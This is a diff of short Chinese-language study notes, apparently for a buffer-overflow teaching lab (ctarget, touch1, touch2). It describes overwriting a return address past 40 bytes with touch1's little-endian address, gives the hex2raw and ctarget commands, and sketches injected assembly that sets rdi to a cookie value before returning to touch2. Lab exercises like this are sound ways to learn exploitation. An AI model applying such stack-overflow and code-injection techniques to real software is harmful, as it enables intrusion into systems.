@@ -1,10 +1,25 @@
 
 
-level1:前面40个字节正常的输入，最后8个字节是 touch1的地址004017c0。
+level1:
+前面40个字节正常的输入，最后8个字节是 touch1的地址004017c0。
 但因为小端的问题，所以要反过来写：c0 17 40 00
 
 ./hex2raw < level1hex.txt > level1raw.txt
 ./ctarget -q < level1raw.txt
+
+
+
+
+level2:
+
+add dif,%rsp #dif还要算, 让rsp指向 touch2的位置
+mov 0x59b997fa, %rdi
+retq
+touch2的地址。
+
+把栈给画出来即可
+
+
 
 
 
